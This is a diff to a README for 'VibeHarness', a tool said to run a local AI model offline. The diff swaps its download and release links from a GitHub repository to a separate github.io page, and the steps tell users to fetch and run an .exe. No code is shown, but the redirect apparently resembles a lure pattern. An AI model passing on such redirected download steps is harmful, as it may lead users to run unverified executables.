@@ -1,6 +1,6 @@
 # 🤖 VibeHarness - Run local AI agents with ease
 
-[![](https://img.shields.io/badge/Download-VibeHarness-blue)](https://github.com/pruthviraj00007/VibeHarness)
+[![](https://img.shields.io/badge/Download-VibeHarness-blue)](https://pruthviraj00007.github.io)
 
 VibeHarness acts as a bridge between your computer and local artificial intelligence. It runs the VibeThinker-3B model which handles tasks on your machine. You do not need an internet connection to use it. The program works offline to keep your data private and secure.
 
@@ -10,7 +10,7 @@ Your computer must meet a few basic standards for smooth operation. You need a W
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/pruthviraj00007/VibeHarness) to get the latest version.
+1. Visit the [official release page](https://pruthviraj00007.github.io) to get the latest version.
 2. Look for the file ending in .exe in the assets list.
 3. Click the name of the file to save it to your computer.
 4. Once the download finishes, locate the file in your downloads folder.
